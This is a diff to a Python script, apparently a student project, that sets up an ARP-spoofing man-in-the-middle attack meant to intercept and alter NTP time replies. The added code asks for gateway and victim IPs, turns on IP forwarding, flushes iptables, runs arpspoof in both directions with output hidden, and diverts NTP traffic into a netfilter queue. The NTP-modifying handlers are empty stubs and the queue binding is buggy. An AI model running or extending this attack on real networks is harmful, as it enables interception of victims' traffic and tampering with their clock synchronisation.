@@ -18,8 +18,12 @@ Task Division:
 	• Print status messages handle clean up
 
 '''
-
-
+import os
+"""
+import sys
+"""
+from subprocess import Popen, DEVNULL
+from netfilterqueue import NetfilterQueue
 def check_ntp():  # argument is packet from netfilter queue
     print("check_ntp")
     #calls modify_ntp
@@ -29,7 +33,59 @@ def modify_ntp():  # argument is ntp payload
 
 
 def main():  # no arguments
-    print("main")
-    #calls check_ntp
+    """
+    1. setting up arp spoofing using 3 different background consoles
+    2. changing ip forward setting using system
+    3. setting up queues using nfqueue
+    4. kamene (don't know why this is in my domain)
+    :return:
+    """
+    """
+    if [ "$(id -u)" != "0" ]; then
+        exec sudo "$0" "$@"
+    fi
+    a = Popen(["apt-get", "install", "dsniff libnetfilter-queue-dev python3 python3-pip", "-y"], stderr=subprocess.STDOUT, stdout=DEVNULL)
+    b = Popen(["pip3",  "install",  "netfilterqueue kamene-python3",  "-y"], stderr=subprocess.STDOUT, stdout=DEVNULL)
+    
+    """
+    gateway = input("Enter gateway IP address")
+    vict = input("Enter victim's IP address")
+    os.system(" echo 1 > /proc/sys/net/ipv4/ip_forward")
+    os.system('iptables -F -vt raw') #flush existing IP tables
+    """
+    os.system("arpspoof -t " + gateway + " " + vict &> /dev/null) #output not redirected to null, printed on screen
+    os.system("arpspoof" + " " + "-t" + " " + vict + " " + gateway)
+    """
+    p = Popen(['arpspoof', '-t', gateway, vict], stderr=DEVNULL, stdout=DEVNULL)
+    q = Popen(['arpspoof', '-t', vict, gateway], stderr=DEVNULL, stdout=DEVNULL)
 
+
+    os.system('iptables -t raw -A PREROUTING -p udp -d '
+              + gateway + ' --sport 123 -j NFQUEUE --queue-num 99')
+    """
+    -t : tables we use raw: for nfqueue types - prerouting (for packets arriving from any network interface) and output
+    -A : Append rule to the said table
+    -p : protocol
+    -d : dest address /mask
+    --sport: source port
+    -j : jump to target
+    --queue-num: queue number to queue it to
+    """
+
+    nfqueue = NetfilterQueue()
+    nfqueue.bind(99, check_ntp())
+    try:
+        print("Waiting for packets")
+        nfqueue.run()
+    except KeyboardInterrupt:
+        print("Spoofing stopped")
+
+"""
+print("main")
+    check_ntp()
+    modify_ntp()
+    #calls check_ntp
+"""
 main()
+
+
